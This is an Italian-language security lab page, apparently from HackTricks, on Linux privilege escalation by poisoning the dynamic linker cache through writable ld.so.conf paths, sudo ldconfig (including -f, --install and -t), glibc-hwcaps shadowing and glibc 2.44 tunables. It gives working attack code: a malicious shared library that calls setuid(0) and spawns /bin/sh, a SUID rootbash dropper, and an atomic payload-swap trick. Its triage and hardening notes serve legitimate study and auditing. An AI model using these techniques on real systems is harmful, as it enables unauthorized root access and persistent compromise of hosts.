# Esempio di exploit di privesc per ld.so

{{#include ../../banners/hacktricks-training.md}}

Questa pagina è un laboratorio focalizzato sull'avvelenamento della **cache del linker di sistema tramite `/etc/ld.so.conf` o `ldconfig`**. Per l'iniezione di librerie mancanti, `RPATH`/`RUNPATH` scrivibili, `LD_PRELOAD` e altri abusi generici del linker SUID, consulta [Abuso delle librerie condivise e del linker SUID](suid-shared-library-and-linker-abuse.md).

## Preparare l'ambiente

Nella sezione seguente puoi trovare il codice dei file che useremo per preparare l'ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** quei file sul tuo computer nella stessa cartella
2. **Compila** la **libreria**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` in `/usr/lib` e aggiorna la cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilegi di root)
4. **Compila** l'**eseguibile**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Controlla l'ambiente

Verifica che _libcustom.so_ venga **caricata** da _/usr/lib_ e che tu possa **eseguire** il binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandi utili per il triage

Quando attacchi un target reale, verifica il **nome esatto della libreria** richiesta dal binario, cosa sta **risolvendo attualmente il loader** e quali percorsi configurati sono scrivibili senza modificare la cache attiva.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Usa `ldd` solo su un eseguibile **attendibile**. Alcune implementazioni o interpreti ELF insoliti possono causare l'esecuzione di codice controllato dall'attacker; `objdump -p ./file | grep NEEDED` elenca in modo sicuro le dipendenze dirette. Per un target attendibile, invocare l'interprete individuato con `--list` mostra la risoluzione effettiva. Confronta quell'output con `--inhibit-cache --list`: una differenza dimostra che è stato `/etc/ld.so.cache`, anziché una normale regola del percorso di ricerca, a selezionare l'oggetto.<sup>[[1]](#references)[[4]](#references)</sup>

Alcune importanti insidie:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` di solito **non funziona** perché
la redirezione viene eseguita dalla shell corrente. Usa invece
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- I binari **SUID/privilegiati** vengono eseguiti in **secure-execution mode**: `LD_LIBRARY_PATH`
viene ignorato, mentre `LD_PRELOAD` è limitato (i nomi contenenti slash
vengono ignorati e possono essere precaricate solo le librerie contrassegnate
come setuid nelle directory standard). Quando root esegue `ldconfig`, le directory elencate in
`/etc/ld.so.conf` possono essere inserite in `/etc/ld.so.cache`, quindi questa configurazione errata può
comunque influire sui programmi privilegiati.<sup>[[1]](#references)[[2]](#references)</sup>
- Anche `LD_DEBUG` viene ignorato in secure-execution mode a meno che non esista `/etc/suid-debug`, quindi raccogli la relativa traccia da un'esecuzione non-SUID equivalente invece di aspettarti output dall'esecuzione privilegiata.<sup>[[1]](#references)</sup>
- In glibc 2.33 e versioni successive, il dynamic loader espone anche
`--list-diagnostics`, che stampa informazioni diagnostiche del loader leggibili dalle macchine e informazioni sui percorsi di ricerca integrati quando un hijack non si comporta come previsto.<sup>[[1]](#references)[[6]](#references)</sup>

### Vincoli della cache e del SONAME

`ldconfig` non memorizza nella cache ogni file arbitrario presente in una directory configurata: esamina gli header ELF, riconosce i nomi che corrispondono a `lib*.so*` o `ld-*.so*` e si aspetta la catena convenzionale `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. L'oggetto iniettato deve quindi avere l'architettura/classe del target, il nome `DT_NEEDED` esatto (normalmente il suo `DT_SONAME`) e tutti i simboli/le versioni che il victim risolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Preferisci una library specifica per il target, come in questo esempio. Fare shadowing di un SONAME comune con un oggetto incompleto può compromettere ogni processo che lo risolve prima dell'avvio del target privilegiato.<sup>[[3]](#references)</sup>

### Persistenza del percorso nella cache e swap atomici

La cache registra una corrispondenza **nome della library a pathname**; non incorpora l'oggetto condiviso. Dopo che un pathname controllato dall'attaccante è stato memorizzato nella cache, sostituire l'oggetto in quel percorso esatto influisce sui processi avviati successivamente senza un'altra esecuzione di `ldconfig`. Ciò consente un utile pattern di time-of-check/time-of-use: esporre una library valida durante la ricostruzione o l'ispezione della cache da parte di un amministratore, quindi rinominare atomicamente il payload sopra di essa. I processi già in esecuzione mantengono l'oggetto che hanno già mappato.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Analogamente, eliminare la riga dannosa da `ld.so.conf` non rimuove di per sé una voce già scritta: l'amministratore deve rimuovere l'oggetto non affidabile, correggere la proprietà e i permessi di scrittura, quindi ricostruire la cache. Usa il confronto `--inhibit-cache` riportato sopra per distinguere una voce obsoleta nella cache da un percorso di configurazione ancora attivo.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

In questo scenario, supponiamo che un amministratore abbia aggiunto una voce vulnerabile a un
file sotto `/etc/ld.so.conf.d/` incluso dal file di sistema
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La cartella vulnerabile è _/home/ubuntu/lib_ (dove abbiamo accesso in scrittura).\
**Scarica e compila** il seguente codice all'interno di quel percorso:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Se prevedi che **root** (o un altro account privilegiato) esegua in seguito il binario vulnerabile, di solito è meglio lasciare un **artefatto di proprietà di root** invece di avviare una shell interattiva. Ad esempio:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Quindi, dopo l'esecuzione con privilegi, puoi usare `/tmp/rootbash -p`.

Ora che abbiamo **creato la libreria libcustom dannosa all'interno del percorso configurato in modo errato**, la cache predefinita deve essere ricostruita da un'esecuzione riuscita e con privilegi di **`ldconfig`**. Un riavvio è utile solo quando il processo di avvio locale lo invoca effettivamente; altrimenti, attendi un'azione dell'amministratore oppure usa una regola sudo non sicura, se disponibile.<sup>[[2]](#references)</sup>

Dopo che ciò è avvenuto, **ricontrolla** da dove l'eseguibile `sharedvuln` sta caricando la libreria `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Come puoi vedere, lo sta **caricando da `/home/ubuntu/lib`** e, se un utente qualsiasi lo esegue, verrà eseguita una shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Nota che in questo esempio non abbiamo effettuato un'escalation dei privilegi, ma modificando i comandi eseguiti e **attendendo che root o un altro utente privilegiato esegua il binario vulnerabile** saremo in grado di effettuare un'escalation dei privilegi.

### Shadowing moderno di `glibc-hwcaps`

A partire da glibc 2.33, il loader può preferire librerie ottimizzate nelle directory `glibc-hwcaps/<level>/` all'interno di **ogni directory di ricerca delle librerie**. Di conseguenza, controllare solo `/home/ubuntu/lib` è insufficiente: una sottodirectory compatibile e scrivibile, come `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, può eseguire lo shadowing della libreria di base dopo che `ldconfig` l'ha indicizzata, mentre le altre CPU continuano a utilizzare l'oggetto di base. Questo fornisce anche un hijack selettivo per architettura che può non essere rilevato quando la validazione viene eseguita su una CPU diversa.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
L'attuale guida di hardening di glibc raccomanda di evitare SONAME duplicati, percorsi di ricerca non predefiniti e oggetti nelle sottodirectory `glibc-hwcaps`. Dal punto di vista dell'audit, applica ricorsivamente i controlli di ownership e di scrivibilità alle directory configurate e ai relativi componenti del percorso padre.<sup>[[3]](#references)</sup>

### Altre misconfigurations - Stessa vuln

Nell'esempio precedente abbiamo simulato una misconfiguration in cui un amministratore **ha impostato una cartella non privilegiata all'interno di un file di configurazione dentro `/etc/ld.so.conf.d/`**.\
Tuttavia, esistono altre misconfigurations che possono causare la stessa vulnerabilità: se disponi di **permessi di scrittura** in un **file di configurazione** caricato, puoi creare un file in una directory `/etc/ld.so.conf.d/` scrivibile oppure puoi scrivere in `/etc/ld.so.conf`, puoi configurare e sfruttare la stessa vulnerabilità.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Supponiamo che tu disponga di privilegi sudo su `ldconfig`**. `ldconfig` accetta directory di scansione come argomenti posizionali, quindi la forma più breve di cache poisoning è spesso semplicemente:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
In alternativa, `-f` seleziona un altro file di configurazione mantenendo l'output della cache predefinita. Questo è utile quando un filtro degli argomenti blocca le directory posizionali ma consente comunque `-f`, oppure quando è necessario iniettare diversi percorsi:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ora, come indicato nel **previous exploit**, **crea la libreria dannosa all'interno di `/tmp`**.\
Infine, carichiamo il percorso e verifichiamo da dove il binario sta caricando la libreria:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Come puoi vedere, disponendo di privilegi sudo su `ldconfig` puoi sfruttare la stessa vulnerabilità.** I dettagli delle opzioni sono importanti quando si valuta una regola sudo limitata: `-f` seleziona un'altra configurazione, ma ricostruisce comunque `/etc/ld.so.cache`; `-C` reindirizza la cache altrove; `-N` impedisce la ricostruzione della cache; mentre `-X` impedisce gli aggiornamenti dei link, ma **ricostruisce comunque la cache, a meno che non venga combinato con `-N`**. `-n` implica `-N`, quindi può aggiornare i link nelle directory fornite, ma non può avvelenare la cache; `-r` opera sotto una root alternativa e normalmente non modifica la cache dell'host.<sup>[[2]](#references)</sup>

### glibc 2.44: installazione di una cache precompilata

Glibc 2.44 ha aggiunto `ldconfig --install SOURCE`, che copia atomicamente una cache precompilata nella destinazione della cache selezionata (la `/etc/ld.so.cache` dell'host, a meno che `-C` o `-r` non la modifichino). Questo crea un altro argomento pericoloso nelle regole sudoers e nei wrapper privilegiati: un attacker può creare una cache valida **senza privilegi**, quindi usare l'invocazione `--install` consentita per sostituire la cache di sistema. Il percorso di installazione verifica il magic della cache, ma non rigenera le relative entry a partire da una configurazione attendibile.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
La cache contiene ancora **pathnames**, non i byte delle librerie, quindi `/tmp/libcustom.so` deve rimanere presente e compatibile quando la vittima si avvia. I filtri che si limitano a rifiutare `-f`, le directory posizionali o `-t` sono quindi incompleti su glibc 2.44: devono rifiutare anche `--install`/`-I` o, preferibilmente, non delegare affatto `ldconfig`.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: tunables memorizzati nella cache a livello di sistema

A partire da glibc 2.44, `ldconfig` analizza anche `/etc/tunables.conf` e memorizza le sue impostazioni come estensione in `/etc/ld.so.cache`. Il file accetta direttive `include` e filtri per-processo. I prefissi controllano l'ambito: `@`/`onlysecure` si applica solo ai processi `AT_SECURE`, `$`/`nonsecure` li esclude e `*`/`anysecure` include entrambi. **Una voce senza prefisso viene applicata per impostazione predefinita ai processi non-secure**, quindi un attaccante deve usare esplicitamente `@` o `*` per influenzare programmi setuid, setgid o con capability elevate. Questo amplia il perimetro dell'audit oltre le directory delle librerie: una configurazione tunables scrivibile o un file incluso può influenzare i futuri avvii dei programmi dopo una ricostruzione privilegiata della cache.<sup>[[7]](#references)[[9]](#references)</sup>

La stessa release aggiunge `ldconfig -t TUNCONF`, che seleziona un file tunables alternativo continuando a scrivere la cache normale, a meno che un'altra opzione non la modifichi. Pertanto, i wrapper e le regole sudo che tentavano di bloccare solo `-f` devono rifiutare anche `-t`, le directory posizionali arbitrarie, `--install` e la manipolazione dell'output della cache.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Tunable selettive per target

Il filtro `[proc:PATTERN]` applica le voci seguenti solo quando il percorso completo `/proc/self/exe` dell'eseguibile (se `PATTERN` inizia con `/`) o il basename corrisponde. Un filtro termina al filtro successivo, con `[]`, alla fine del file o al confine di un include-file. Questo rende una cache avvelenata meno rumorosa, perché il comportamento alterato può essere limitato a una sola vittima privilegiata.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
Il prefisso `-`/`nonoverridable` impedisce a `GLIBC_TUNABLES` di sovrascrivere un valore memorizzato nella cache; `+`/`overridable` ripristina il normale comportamento di override. Per i processi `AT_SECURE`, la variabile d'ambiente viene comunque ignorata completamente. Considera il formato del file specifico della versione: il progetto glibc non lo garantisce come interfaccia stabile, ed elenca i nomi e i valori supportati con `"$interp" --list-tunables` prima di tentare un effetto mirato.<sup>[[7]](#references)[[9]](#references)</sup>

Questo non equivale automaticamente all'esecuzione arbitraria di codice. È una primitiva privilegiata di **manipolazione del comportamento del loader**: glibc avverte esplicitamente che i valori a livello di sistema possono applicare tunable sensibili per la sicurezza ai programmi setuid/setgid senza un controllo di sicurezza per ciascun tunable. Cerca modifiche all'allocator specifiche per il target, modifiche alle protezioni della CPU o condizioni di denial-of-service, invece di presumere un payload universale.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening del Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - pagina del manuale Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostica del Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables a livello di sistema (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Aggiunta di tunables a livello di sistema: parte ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [La versione 2.44 di The GNU C Library è ora disponibile](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [Codice sorgente di ldconfig di glibc 2.44](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
